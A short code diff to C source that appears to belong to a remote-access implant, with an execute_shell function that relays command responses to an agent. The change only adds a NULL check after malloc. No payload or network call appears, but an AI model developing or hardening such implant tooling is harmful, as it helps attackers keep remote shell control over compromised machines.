@@ -7,6 +7,7 @@
 #include <string.h>
 #include <pthread.h>
 #include <signal.h>
+#include <stdbool.h>
 
 #include "queue.h"
 #include "implant.h"
@@ -127,7 +128,10 @@ static int execute_shell(){
 				break;
 			}
 			else{
-				buffer = malloc(nbytes);
+				if ((buffer = malloc(nbytes)) == NULL){
+					agent_close_flag = true;
+					break;
+				}
 				memcpy(buffer, buf, nbytes);
 				
 				debug_print("got command response: %s\n", buffer);
